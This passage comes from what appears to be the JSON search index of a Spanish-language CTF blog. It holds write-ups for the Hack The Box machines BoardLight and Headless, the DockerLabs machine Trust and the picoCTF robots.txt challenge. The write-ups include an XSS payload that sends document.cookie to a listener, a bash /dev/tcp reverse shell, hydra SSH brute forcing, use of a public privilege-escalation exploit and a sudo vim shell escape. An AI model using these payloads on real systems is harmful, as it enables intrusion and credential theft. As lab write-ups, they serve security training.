REALIZAR TÚ EL RETO\u0026gt;\nWRITEUP BOARDLIGHT - HACK THE BOX # Primero de todo vamos a configurar nuestro archivo \u0026ldquo;/etc/hosts\u0026rdquo; añadiendo así el primer dominio para la máquina.\nVamos a ver con ayuda del comando nmap, que puertos están abiertos de cara a pwnear la máquina.\nComo vemos, tenemos el puerto 80 - HTTP y el puerto 22 - SSH.\nUna vez entramos a la web vamos a mirarla para buscar pistas o posibles credenciales que nos ayuden a un mejor acceso en la web, de mientras, vamos a realizar fuzzing en subdominios para ver si hay algún subdominio.\n❯ wfuzz -c --hc=403 -t 20 -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -H \u0026#34;Host: FUZZ.board.htb\u0026#34; http://board.htb Una vez ejecutamos el comando, vemos que hemos encontrado un subdominio llamado \u0026ldquo;crm\u0026rdquo;. Una vez con este subdominio, vamos añadirlo en nuestro archivo \u0026ldquo;/etc/hosts\u0026rdquo;.\nUna vez hemos añadido el subdominio correctamente, vamos acceder al mismo para continuar con la máquina.\nCuando accedemos vemos que tenemos un panel login con un servicio llamado \u0026ldquo;Dolibarr\u0026rdquo; vamos a probar a entrar con credenciales básicas a ciegas como \u0026ldquo;admin - admin\u0026rdquo; \u0026ldquo;user - 1234\u0026rdquo;\u0026hellip;\nAl probar credenciales básicas nos damos cuenta que con \u0026ldquo;admin - admin\u0026rdquo; conseguimos atravesar el\nUna vez revisamos la web nos damos cuenta que hay un apartado interesante el cual permite crear nuestra propia web.\nVamos rellenando los apartados que nos pide para poder crear nuestra web.\nCreamos la página.\nAl crear nuestra web nos damos cuenta que podemos editar el código HTML de nuestra página, vamos a ver si podemos ejecutar comandos.\nUna vez guardamos el documento editado, nos damos cuenta que si es posible ejecutar comandos.\nComo vemos, nos ejecuta correctamente el comando \u0026ldquo;ls\u0026rdquo;, por lo cual, vamos a probar a mandar una reverse shell para conseguir acceso al interior de la máquina. Repetimos el paso anterior pero esta vez substituyendo el \u0026ldquo;ls\u0026rdquo; por la reverse shell.\nGuardamos y ejecutamos la reverse shell.\nUna vez conseguido el acceso, vamos a realizar el tratado de terminal para poder movernos cómodamente por el sistema.\nUna vez realizado el tratado de terminal, vamos a buscar el archivo de configuración de Dolibarr para conseguir acceso. Recordar que hemos entrado como un usuario y pueden haber más.\nUna vez encontramos el archivo de configuración de Dolibarr encontramos el usuario y la contraseña de un posible usuario para conectarnos por ssh (siendo el mismo usuario que tenemos en este sistema)\nVamos a probar las credenciales obtenidas por ssh.\nComo observamos, las credenciales funcionan y ya tenemos acceso a la máquina, por lo cual tendremos exitosamente la flag del usuario.\nVamos a comprobar posibles escaladas para conseguir ser el root.\nSi utilizamos la escalada de explotación de binarios al ejecutar el comando\n❯ find -perm -4000 2\u0026gt;/dev/null Observamos que hay unos binarios con una librería interesante.\nSi buscamos documentación sobre la librería y el binario, nos sale que hay un exploit relacionado.\n[CVE-2022-37706-LPE-exploit](https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit) Este es el exploit que podría funcionarnos, para usarlo en la máquina vamos abrirnos un servidor en Python para pasarnos el archivo.\nCREACIÓN SERVIDOR PYTHON:\n❯ sudo python3 -m http.server 80 PASARSE ARCHIVOS A LA MÁQUINA\n❯ wget TUIP/CVE-2022-37706-LPE-exploit -r Una vez hemos pasado el archivo, entraremos en la carpeta y daremos permiso al script del CVE.\n❯ chmod +x exploit.sh Una vez hemos otorgado los permisos ejecutaremos el script.\nComo observamos, ya somos el usuario root, vamos a sacar la root flag.\n","date":"1 January 0001","externalUrl":null,"permalink":"/retos/hackthebox/boardlight/","section":"Retos","summary":"ANTES DE VER EL WRITEUP ES RECOMENDABLE QUE PRUEBES A REALIZAR TÚ EL RETO\u0026gt;","title":"Writeup - BoardLight","type":"retos"},{"content":" ANTES DE VER EL WRITEUP ES RECOMENDABLE QUE PRUEBES A REALIZAR TÚ EL RETO\u0026gt;\nWRITEUP HEADLESS - HACK THE BOX # CONFIGURACIÓN # Antes de comenzar la máquina vamos a asignar la dirección de IP junto su DNS.\n❯ sudo nano /etc/hosts INTRUSIÓN # Para iniciar correctamente la máquina será necesario realizar una breve comprobación de que puertos se encuentran activos, para ello, vamos a utilizar el comando \u0026ldquo;nmap\u0026rdquo;.\n❯ sudo nmap -p- --open -sS --min-rate 5000 -vvv -Pn -n 10.10.11.8 -oG allPorts PUERTOS ABIERTOS # PUERTO SERVICIO 22 SSH 5000 UPNP (PUERTO WEB HTTP) EXPLOTACIÓN WEB # Vamos a utilizar la herramienta \u0026ldquo;Gobuster\u0026rdquo; para poder enumerar posibles directorios que pueden salir en la web.\n❯ gobuster dir -u http://10.10.11.8:5000/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 20 -x php,html DIRECTORIOS HALLADOS # Support\nDashboard\nCuando accedemos al primer directorio \u0026ldquo;Support\u0026rdquo; encontramos un formulario, nos llama la atención que podríamos probar un XSS.\n\u0026lt;script\u0026gt;\rvar email = prompt(\u0026#34;Porfavor, introduce tu correo electronico\u0026#34;,\u0026#34;example@exaple.com\u0026#34;);\rif (email == null || email == \u0026#34;\u0026#34;){\ralert(\u0026#34;Es necesario introducir un correo valido\u0026#34;);\r} else {\rfetch(\u0026#34;http://192.168.1.24/?email=\u0026#34; + email);\r}\r\u0026lt;/script\u0026gt; Vemos que podría ser posible realizar XSS para la obtención de la credencial de administración. Vamos a utilizar \u0026ldquo;Burpsuite\u0026rdquo; para interceptar la petición y revisar si es posible continuar con la inyección.\nUna vez nos encontramos en el repeater, vamos a realizar la inyección para obtener la credencial de administrador, para ello, vamos a crear un servidor en Pyhton para que las credenciales puedan llegar.\n❯ python3 -m http.server 80 \u0026lt;script\u0026gt;\rvar request = new XMLHttpRequest();\rrequest.open(\u0026#39;GET\u0026#39;, \u0026#39;http://localhost/?coockie=\u0026#39; + document.cookie);\rrequest.send();\r\u0026lt;/script\u0026gt; Ahora ya podremos acceder al otro directorio (Dashboard) pero deberemos de autenticarnos como admin con su cookie. Recargamos la página para poder acceder como Admin.\nYa estariamos dentro, como vemos si pulsamos el botón, genera otra petición, por lo cual vamos a repetir el proceso de antes interceptando la petición. Podría ser un posible OS Command Injection, vamos a ver si funciona para posterior explotación.\ndate=xx;\u0026#34;PARAMETRO\u0026#34; Como vemos, si es vulnerable a Command Injection, por lo cual vamos a ver si podemos inyectar una reverse shell para poder ganar acceso al sistema.\n❯ nc -nlvp 443 ❯ bash+-c+\u0026#34;bash+-i+\u0026gt;%26+/dev/tcp/IP-ATACANTE/PUERTO-ESCUCHA+0\u0026gt;%261\u0026#34; Como vemos, ha salido satisfactoriamente el RCE, lo que significa que ya podemos movernos por el sistema que hemos comprometido, sin antes realizar el tratado de terminal para que sea más cómodo.\n❯ stty raw -echo; fg\r❯ ^Z\r❯ reset\r❯ xterm\r❯ stty size ❯ stty rows 22 columns 90 ❯ export TERM=xterm ESCALADA DE PRIVILEGIOS # USER FLAG # ROOT FLAG # Como vemos en la siguiente imagen, se trata de una escalada de privilegios sudoer, hay que conseguir ejecutarlo para convertirnos en root.\nEl archivo sudoer llama a un script llamado \u0026ldquo;initdb.sh\u0026rdquo; deberemos de lograr ejecutar ese script para poder convertirnos en usuario root, para ello vamos a acceder en e script.\nComo observamos, ya somos root y ya podemos obtener nuestra root flag.\n","date":"1 January 0001","externalUrl":null,"permalink":"/retos/hackthebox/headless/","section":"Retos","summary":"ANTES DE VER EL WRITEUP ES RECOMENDABLE QUE PRUEBES A REALIZAR TÚ EL RETO\u0026gt;","title":"Writeup - Headless","type":"retos"},{"content":" WRITEUP TRUST - DOCKERLABS # INTRUSIÓN # RECONOCIMIENTO # ❯ sudo nmap -p- --open -sS --min-rate 5000 -vvv -Pn -n 172.19.0.2 -oG allPorts PUERTOS # PUERTO SERVICIO 22 SSH 80 HTTP SERVICIO HTTP # Página Apache por defecto, vamos a buscar directorios.\n❯ gobuster dir -u http://172.19.0.2/ -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt -t 20 -x html,php,txt,js Como observamos en pantalla, vemos un usuario llamado \u0026ldquo;Mario\u0026rdquo; vamos a ver si con el usuario podemos obtener credenciales para el SSH realizando fuerza bruta al mismo servicio.\n❯ hydra -l mario -P /usr/share/wordlists/rockyou.txt ssh://172.19.0.2 Una vez obtenidas estas credenciales, vamos a probarlas en el SSH.\nESCALADA DE PRIVILEGIOS # Como podemos ver, hemos conseguido acceso al SSH, ahora vamos a probar posibles escaladas de privilegios.\nComo vemos, disponemos de \u0026ldquo;VIM\u0026rdquo; con permiso SUDO, vamos aver si podemos ejecutar una bash como root abusando de VIM.\n❯ sudo /usr/bin/vim -c \u0026#39;:!/bin/bash\u0026#39; ","date":"1 January 0001","externalUrl":null,"permalink":"/retos/dockerlabs/trust/","section":"Retos","summary":"WRITEUP TRUST - DOCKERLABS # INTRUSIÓN # RECONOCIMIENTO # ❯ sudo nmap -p- --open -sS --min-rate 5000 -vvv -Pn -n 172.","title":"Writeup - Trust","type":"retos"},{"content":" WRITEUP RETO [WHERE ARE THE ROBOTS] WEB EXPLOITATION # ANTES DE VER EL WRITEUP ES RECOMENDABLE QUE PRUEBES A REALIZAR TÚ EL RETO.\nInicio del reto \u0026ldquo;Where are the robots\u0026rdquo; # Una vez entremos al entorno para empezar el reto, nos saldra únicamente el contenido de arriba, que prestandole atención nos da mucha información de cara a la resolución del reto.\nINFORMACIÓN SOBRE EL CONTENIDO VISUAL DE LA PÁGINA # Al mirar la página, notamos de inmediato un mensaje que dice: \u0026lsquo;Where are the robots? - ¿Dónde están los robots?\u0026rsquo;. Esta frase hace referencia al famoso protocolo Robots.txt.\n¿Cómo ver el contenido de \u0026ldquo;Robots.txt\u0026rdquo;? # En primer lugar, nos posicionaremos sobre el enlace de la web\nUna vez que estamos posicionados encima, nos desplazamos al final del enlace y agregamos lo siguiente: /robots.txt\nDebería de quedarnos así:\nUna vez entremos, veremos que nos salen dos lineas visibles. User-agent: *\nDisallow: /8028f.html\nSi repetimos el proceso de posicionar el cursor sobre el enlace de la web reitrando el directorio /robots.txt y agregamos el contenido de Disallow al final del enlace, conseguiremos la flag.\n","date":"1 January 0001","externalUrl":null,"permalink":"/retos/picoctf/wherearetherobots/","section":"Retos","summary":"WRITEUP RETO [WHERE ARE THE ROBOTS] WEB EXPLOITATION # ANTES DE VER EL WRITEUP ES RECOMENDABLE QUE PRUEBES A REALIZAR TÚ EL RETO.","title":"Writeup - Where are the Robots","type":"retos"}]